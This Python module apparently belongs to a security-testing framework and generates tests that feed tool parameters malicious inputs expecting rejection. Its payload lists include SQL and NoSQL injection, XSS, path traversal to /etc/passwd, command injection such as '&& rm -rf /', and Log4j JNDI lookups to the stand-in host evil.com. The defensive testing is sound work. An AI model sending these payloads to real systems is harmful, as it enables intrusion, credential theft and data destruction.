"""Security test rules for generating attack vector tests."""

from typing import List
from framework_poc.core.models import SchemaAnalysis, TestCase


# Security payloads for injection testing
INJECTION_PAYLOADS = [
    # Path traversal
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32",
    "%2e%2e%2f%2e%2e%2f",
    "../../",

    # SQL injection
    "'; DROP TABLE users--",
    "' OR '1'='1",
    "1' UNION SELECT * FROM users--",

    # XSS
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert('xss')>",
    "javascript:alert('xss')",

    # Command injection
    "; cat /etc/passwd",
    "| ls -la",
    "&& rm -rf /",

    # LDAP/Log4j style
    "${jndi:ldap://evil.com/a}",
    "${jndi:rmi://evil.com/a}",

    # NoSQL injection
    "{'$ne': null}",
    "{'$gt': ''}",

    # URL injection
    "?param=value",
    "#fragment",
    "?redirect=http://evil.com",

    # Null byte injection
    "test\x00.txt",

    # Format string
    "%s%s%s%s%s",
    "%n%n%n%n",
]


def generate_injection_tests(schema: SchemaAnalysis) -> List[TestCase]:
    """
    Test for injection vulnerabilities.

    Args:
        schema: Tool schema analysis

    Returns:
        List of injection test cases
    """
    tests = []

    for param in schema.get_string_parameters():
        # Apply subset of payloads based on parameter type
        payloads = _select_relevant_payloads(param.name)

        for payload in payloads:
            payload_hash = abs(hash(payload)) % 10000
            tests.append(TestCase(
                id=f"L2_{schema.tool_name}_{param.name}_inj_{payload_hash}",
                layer=2,
                category="security",
                description=f"Injection test for {param.name}: {payload[:30]}...",
                params={param.name: payload},
                expected_result="rejected",
                assertions=["error_type_validation"]
            ))

    return tests


def generate_id_validation_tests(schema: SchemaAnalysis) -> List[TestCase]:
    """
    Test ID parameter validation.

    Args:
        schema: Tool schema analysis

    Returns:
        List of ID validation test cases
    """
    tests = []

    for param in schema.parameters:
        if param.type == "string" and "id" in param.name.lower():
            # Test various invalid ID formats
            invalid_ids = [
                "../../admin",
                "../user/123",
                "user@domain.com",
                "<script>",
                "'; DROP TABLE",
                "00u' OR '1'='1",
                "javascript:alert(1)",
                "${jndi:ldap://evil.com}",
            ]

            for invalid_id in invalid_ids:
                id_hash = abs(hash(invalid_id)) % 10000
                tests.append(TestCase(
                    id=f"L2_{schema.tool_name}_{param.name}_invalid_id_{id_hash}",
                    layer=2,
                    category="security",
                    description=f"Invalid ID format for {param.name}",
                    params={param.name: invalid_id},
                    expected_result="rejected",
                    assertions=["error_type_validation"]
                ))

    return tests


def generate_overflow_tests(schema: SchemaAnalysis) -> List[TestCase]:
    """
    Test for buffer overflow and integer overflow scenarios.

    Args:
        schema: Tool schema analysis

    Returns:
        List of overflow test cases
    """
    tests = []

    # Integer overflow tests
    for param in schema.get_integer_parameters():
        overflow_values = [
            2147483647,  # Max 32-bit int
            2147483648,  # Max 32-bit int + 1
            9223372036854775807,  # Max 64-bit int
            -2147483648,  # Min 32-bit int
            -2147483649,  # Min 32-bit int - 1
        ]

        for value in overflow_values:
            tests.append(TestCase(
                id=f"L2_{schema.tool_name}_{param.name}_overflow_{value}",
                layer=2,
                category="security",
                description=f"Overflow test for {param.name}: {value}",
                params={param.name: value},
                expected_result="error",
                assertions=["error_handled_safely"]
            ))

    # String buffer overflow tests
    for param in schema.get_string_parameters():
        # Very long strings that might cause buffer overflows
        long_strings = [
            "A" * 1000000,  # 1 MB
            "A" * 10000000,  # 10 MB (commented out in real tests due to size)
        ]

        tests.append(TestCase(
            id=f"L2_{schema.tool_name}_{param.name}_buffer_overflow",
            layer=2,
            category="security",
            description=f"Buffer overflow test for {param.name}",
            params={param.name: long_strings[0]},
            expected_result="error",
            assertions=["error_handled_safely"]
        ))

    return tests


def generate_encoding_tests(schema: SchemaAnalysis) -> List[TestCase]:
    """
    Test various encoding attacks.

    Args:
        schema: Tool schema analysis

    Returns:
        List of encoding test cases
    """
    tests = []

    encoding_payloads = [
        # URL encoding
        "%3Cscript%3Ealert('xss')%3C/script%3E",
        "%2e%2e%2f%2e%2e%2f",

        # Double URL encoding
        "%253Cscript%253E",

        # HTML encoding
        "&lt;script&gt;alert('xss')&lt;/script&gt;",

        # Unicode encoding
        "\u003cscript\u003e",

        # Base64
        "PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=",
    ]

    for param in schema.get_string_parameters():
        for payload in encoding_payloads:
            payload_hash = abs(hash(payload)) % 10000
            tests.append(TestCase(
                id=f"L2_{schema.tool_name}_{param.name}_enc_{payload_hash}",
                layer=2,
                category="security",
                description=f"Encoding attack for {param.name}",
                params={param.name: payload},
                expected_result="rejected",
                assertions=["error_type_validation"]
            ))

    return tests


def _select_relevant_payloads(param_name: str) -> List[str]:
    """
    Select relevant payloads based on parameter name.

    Args:
        param_name: Name of the parameter

    Returns:
        List of relevant payloads
    """
    param_lower = param_name.lower()

    # ID parameters - focus on traversal and injection
    if "id" in param_lower:
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "'; DROP TABLE users--",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}",
        ]

    # Search/query parameters - focus on injection
    if any(kw in param_lower for kw in ["search", "query", "filter", "q"]):
        return [
            "' OR '1'='1",
            "<script>alert('xss')</script>",
            "{'$ne': null}",
            "%s%s%s",
        ]

    # URL parameters - focus on URL injection
    if "url" in param_lower:
        return [
            "javascript:alert('xss')",
            "?redirect=http://evil.com",
            "http://evil.com@legitimate.com",
        ]

    # Default - use common payloads
    return INJECTION_PAYLOADS[:5]
